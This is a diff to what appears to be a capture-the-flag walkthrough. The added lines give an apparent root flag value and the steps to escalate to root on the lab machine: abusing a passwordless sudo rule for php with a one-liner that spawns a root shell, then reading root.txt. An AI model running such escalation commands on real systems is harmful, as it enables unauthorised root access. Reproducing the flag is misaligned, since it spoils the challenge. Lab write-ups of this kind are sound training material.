@@ -34,3 +34,9 @@ Spawn the target, gain a foothold and submit the contents of the user.txt flag.
 
 After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
 
+`f1fba6e9f71efb2630e6e34da6387842`
+* `sudo -l` will display `(ALL : ALL) NOPASSWD: /usr/bin/php`, means you can use the php binary without the need of a password
+* go to `https://gtfobins.github.io/gtfobins/php/` to check for a bypass to escalate privileges
+* run `sudo php -r "system('sudo su -');"` to change into root user
+* `cd  /`
+* `cat root.txt`
